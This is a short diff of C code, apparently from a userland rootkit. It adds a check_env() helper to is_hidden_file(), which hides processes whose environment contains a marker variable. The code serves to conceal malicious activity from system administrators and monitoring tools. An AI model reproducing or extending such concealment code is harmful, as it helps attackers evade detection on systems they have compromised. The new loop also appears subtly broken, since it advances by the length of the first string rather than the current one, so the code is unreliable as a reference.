@@ -31,6 +31,16 @@
  * identify the process as a hidden one or not.
  */
 
+static int  check_env(char *haystack, const char *needle) {
+    size_t index = 0;
+    while (index < MAX_LEN) {
+        if (strstr(haystack + index, needle))
+            return (1);
+        index += strlen(haystack) + 1;
+    }
+    return (0);
+}
+
 int         is_hidden_file(const char *path) {
     DEBUG(D_INFO, "called is_hidden_file()");
 
@@ -52,7 +62,7 @@ int         is_hidden_file(const char *path) {
 
                 if (env_file) {
                     while (fgets(line, MAX_LEN, env_file)) {
-                        if (strstr(line, HIDDEN_ENV_VAR))
+                        if (check_env(line, HIDDEN_ENV_VAR))
                             return 1;
 
                         memset(line, 0x00, MAX_LEN);
